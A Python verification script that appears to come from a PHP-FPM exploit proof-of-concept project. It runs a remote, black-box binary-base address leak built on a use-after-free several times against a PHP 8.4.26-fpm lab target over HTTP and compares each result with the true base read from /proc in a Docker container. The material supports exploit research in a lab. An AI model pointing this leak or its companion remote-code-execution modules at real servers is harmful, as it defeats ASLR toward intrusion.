#!/usr/bin/env python3
"""verify fpm_binbase_leak.py's auto-deriving remote binbase leak: it lands
byte-exact on this host's PHP 8.4.26-fpm, cross-checked against /proc. /proc is
the GROUND-TRUTH ORACLE ONLY -- it is never on the exploit path; the leak in
fpm_binbase_leak.py is pure black-box (the UAF's R: heap leak + forged-IS_STRING
reads over the reflecting echo sink).

leak_binbase() AUTO-DERIVES the element-0 object offset per run (hardcode
first, then a self-validating scan: KNOWN_OBJ_OFFSETS map + fine band, each
accepted only when its image pointer yields a 2 MB-aligned binbase confirmed by
a second image pointer OR by a real php-fpm ELF-header read at the derived
base). This verifier runs the leak N times and checks every run == /proc,
reporting the derived offset + N/N.

Default lab (stand up first):
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-brleak --profile brleak up -d --build   # 8.4.26-fpm + nginx :8169

Run with python3 -I.
"""
import argparse
import os
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from verify_fpm_binbase_leak import load_poc  # noqa: E402


def proc_base(container):
    """Ground-truth php-fpm image base from /proc. The worker is a fork of the
    master, so they share the (fork-shared) PIE base; we read the master's maps
    (readable as root in-container, no ptrace gate) and fall back to a worker.
    Returns (who, base) or (None, None)."""
    script = (
        'for p in /proc/[0-9]*; do '
        'c=$(tr "\\0" " " < "$p/cmdline" 2>/dev/null); '
        'case "$c" in *"master process"*) '
        'echo "master ${p#/proc/}"; grep -m1 php-fpm "$p/maps"; exit 0;; esac; '
        'done; '
        'for p in /proc/[0-9]*; do '
        'c=$(tr "\\0" " " < "$p/cmdline" 2>/dev/null); '
        'case "$c" in *"pool www"*) '
        'echo "worker ${p#/proc/}"; grep -m1 php-fpm "$p/maps"; exit 0;; esac; '
        'done')
    try:
        out = subprocess.check_output(
            ["docker", "exec", container, "sh", "-c", script],
            text=True, timeout=25).strip().splitlines()
        who = out[0]
        base = int(out[1].split("-", 1)[0], 16)
        return who, base
    except Exception:
        return None, None


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--url", default="http://127.0.0.1:8169/remote_app.php")
    ap.add_argument("--container", default="p2s-brleak-fpm",
                    help="fpm container name for the /proc cross-check")
    ap.add_argument("--runs", type=int, default=5,
                    help="reliability runs (default 5)")
    ap.add_argument("--tries", type=int, default=16)
    args = ap.parse_args(argv)

    from urllib.parse import urlsplit
    u = urlsplit(args.url if "://" in args.url else "http://" + args.url)
    poc = load_poc()
    remote_rce = poc._load_remote_rce()
    remote_rce.HOST = u.hostname
    remote_rce.PORT = u.port or 80
    remote_rce.PATH = u.path or "/remote_app.php"
    print(f"[*] target {remote_rce.HOST}:{remote_rce.PORT}{remote_rce.PATH}")

    who, base = proc_base(args.container)
    if base is None:
        print(f"[!] could not read /proc (container {args.container}); "
              f"remote-only results stand, not cross-checked")
    else:
        print(f"[+] /proc ground truth binbase = {base:#x}  ({who})")

    ok = 0
    offs = set()
    for i in range(args.runs):
        binbase, detail = poc.leak_binbase(remote_rce, leak_tries=args.tries, verbose=False)
        if binbase is None:
            print(f"[run {i+1}/{args.runs}] FAILED: {detail.get('error')}")
            continue
        off = detail.get("obj_off")
        offs.add(off)
        tag = (f"lane={detail.get('lane')} OBJ_CHUNK_OFF={off:#x} "
               f"confirm={detail.get('confirm')}")
        if base is None:
            print(f"[run {i+1}/{args.runs}] binbase={binbase:#x}  {tag}  "
                  f"(no /proc; 2MB-aligned={(binbase & 0x1FFFFF) == 0})")
            ok += 1 if (binbase & 0x1FFFFF) == 0 else 0
        elif binbase == base:
            print(f"[run {i+1}/{args.runs}] binbase={binbase:#x} == /proc  {tag}")
            ok += 1
        else:
            print(f"[run {i+1}/{args.runs}] MISMATCH binbase={binbase:#x} "
                  f"!= /proc {base:#x} (delta {binbase-base:#x})  {tag}")

    print(f"\n[reliability] {ok}/{args.runs} "
          f"{'== /proc byte-exact' if base is not None else '2MB-aligned (no /proc)'}")
    print(f"[derived] OBJ_CHUNK_OFF(s) = {{{', '.join(hex(o) for o in sorted(offs))}}}")
    if base is not None and ok == args.runs and args.runs > 0:
        print("[PASS] recalibrated remote binbase leak is byte-exact and stable, "
              "no /proc on the exploit path")
        return 0
    if base is None and ok == args.runs and args.runs > 0:
        print("[PARTIAL] all runs 2MB-aligned; /proc cross-check unavailable")
        return 0
    print("[FAIL] not all runs matched")
    return 1


if __name__ == "__main__":
    sys.exit(main())
